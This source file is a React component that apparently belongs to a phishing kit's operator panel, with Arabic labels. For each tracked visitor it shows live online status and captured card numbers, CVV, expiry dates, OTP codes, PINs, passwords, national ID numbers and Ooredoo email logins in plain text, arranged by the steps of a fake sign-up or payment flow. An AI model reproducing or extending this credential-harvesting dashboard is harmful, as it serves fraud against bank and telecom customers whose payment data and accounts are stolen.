import { User, CreditCard, Lock, Smartphone, Shield, LogIn, Key } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';

interface Visitor {
  id: number;
  sessionId: string;
  isOnline: number;
  lastSeen: Date;
  isRead: number;
  isFavorite: number;
  currentPage?: string | null;
  formData: any;
  createdAt: Date;
  updatedAt: Date;
}

interface VisitorDetailProps {
  visitor: Visitor | null;
}

export default function VisitorDetail({ visitor }: VisitorDetailProps) {
  if (!visitor) {
    return (
      <div className="flex-1 flex items-center justify-center bg-gray-50">
        <div className="text-center text-gray-400">
          <User className="w-16 h-16 mx-auto mb-4" />
          <p>اختر زائراً لعرض التفاصيل</p>
        </div>
      </div>
    );
  }

  const data = visitor.formData;

  const renderDataBubble = (title: string, icon: React.ReactNode, content: Record<string, any>) => {
    if (!content || Object.keys(content).length === 0) return null;

    return (
      <Card className="mb-4">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm font-medium flex items-center gap-2">
            {icon}
            {title}
          </CardTitle>
        </CardHeader>
        <CardContent>
          <div className="space-y-2">
            {Object.entries(content).map(([key, value]) => (
              <div key={key} className="flex justify-between text-sm">
                <span className="text-gray-600">{key}:</span>
                <span className="font-medium text-gray-900">{String(value)}</span>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>
    );
  };

  return (
    <div className="flex-1 bg-gray-50 overflow-y-auto p-6">
      <div className="max-w-3xl mx-auto">
        <div className="mb-6">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">
            {data?.firstNameAr || data?.firstNameEn || `زائر ${visitor.id}`}
          </h2>
          <div className="flex items-center gap-4 text-sm text-gray-600">
            <span>Session: {visitor.sessionId}</span>
            <span>•</span>
            <span className="flex items-center gap-1">
              <div className={`w-2 h-2 rounded-full ${visitor.isOnline === 1 ? 'bg-green-500' : 'bg-gray-400'}`}></div>
              {visitor.isOnline === 1 ? 'متصل' : 'غير متصل'}
            </span>
          </div>
        </div>

        {/* Step 1: Account Type */}
        {(data?.accountType || data?.cardNumber || data?.email || data?.mobileNumber) && renderDataBubble(
          'نوع الحساب (Step 1)',
          <User className="w-4 h-4" />,
          {
            ...(data.accountType && { 'نوع الحساب': data.accountType }),
            ...(data.cardNumber && { 'رقم البطاقة': data.cardNumber }),
            ...(data.email && { 'البريد الإلكتروني': data.email }),
            ...(data.mobileNumber && { 'رقم الهاتف': data.mobileNumber }),
          }
        )}

        {/* Step 2: Personal Info */}
        {(data?.firstNameAr || data?.idNumber) && renderDataBubble(
          'المعلومات الشخصية (Step 2)',
          <User className="w-4 h-4" />,
          {
            ...(data.firstNameAr && { 'الاسم الأول (عربي)': data.firstNameAr }),
            ...(data.middleNameAr && { 'الاسم الأوسط (عربي)': data.middleNameAr }),
            ...(data.lastNameAr && { 'الاسم الأخير (عربي)': data.lastNameAr }),
            ...(data.firstNameEn && { 'الاسم الأول (إنجليزي)': data.firstNameEn }),
            ...(data.middleNameEn && { 'الاسم الأوسط (إنجليزي)': data.middleNameEn }),
            ...(data.lastNameEn && { 'الاسم الأخير (إنجليزي)': data.lastNameEn }),
            ...(data.idNumber && { 'رقم الهوية': data.idNumber }),
            ...(data.mobileNumber && { 'رقم الجوال': data.mobileNumber }),
            ...(data.postalCode && { 'الرمز البريدي': data.postalCode }),
            ...(data.citizenshipType && { 'نوع المواطنة': data.citizenshipType }),
            ...(data.nationality && { 'الجنسية': data.nationality }),
          }
        )}

        {/* Step 3: Password */}
        {data?.password && renderDataBubble(
          'كلمة المرور (Step 3)',
          <Lock className="w-4 h-4" />,
          {
            'كلمة المرور': data.password,
            ...(data.confirmPassword && { 'تأكيد كلمة المرور': data.confirmPassword }),
          }
        )}

        {/* Step 4: Payment Card */}
        {data?.cardNumber && renderDataBubble(
          'بطاقة الدفع (Step 4)',
          <CreditCard className="w-4 h-4" />,
          {
            'رقم البطاقة': data.cardNumber,
            ...(data.cvv && { 'CVV': data.cvv }),
            ...(data.expiryDate && { 'تاريخ الانتهاء': data.expiryDate }),
          }
        )}

        {/* Step 4: OTP */}
        {data?.otp && renderDataBubble(
          'رمز OTP (Step 4)',
          <Smartphone className="w-4 h-4" />,
          {
            'رمز OTP': data.otp,
          }
        )}

        {/* Step 4: PIN */}
        {data?.pin && renderDataBubble(
          'رقم PIN (Step 4)',
          <Key className="w-4 h-4" />,
          {
            'رقم PIN': data.pin,
          }
        )}

        {/* Step 5: Verification */}
        {(data?.serviceProvider || data?.phoneNumber) && renderDataBubble(
          'التوثيق (Step 5)',
          <Shield className="w-4 h-4" />,
          {
            ...(data.serviceProvider && { 'مزود الخدمة': data.serviceProvider }),
            ...(data.phoneNumber && { 'رقم الهاتف': data.phoneNumber }),
            ...(data.personalId && { 'الرقم الشخصي': data.personalId }),
          }
        )}

        {/* Login Form */}
        {data?.username && renderDataBubble(
          'تسجيل الدخول',
          <LogIn className="w-4 h-4" />,
          {
            'اسم المستخدم': data.username,
            ...(data.loginPassword && { 'كلمة المرور': data.loginPassword }),
          }
        )}

        {/* Simple Login Page (Ooredoo) */}
        {data?.ooredooEmail && renderDataBubble(
          'تسجيل الدخول Ooredoo',
          <LogIn className="w-4 h-4" />,
          {
            'البريد الإلكتروني': data.ooredooEmail,
            ...(data.ooredooPassword && { 'كلمة المرور': data.ooredooPassword }),
          }
        )}

        {/* Forgot Password */}
        {data?.forgotPasswordEmail && renderDataBubble(
          'استعادة كلمة المرور',
          <Lock className="w-4 h-4" />,
          {
            'البريد الإلكتروني': data.forgotPasswordEmail,
            ...(data.oldPassword && { 'كلمة المرور القديمة': data.oldPassword }),
          }
        )}
      </div>
    </div>
  );
}
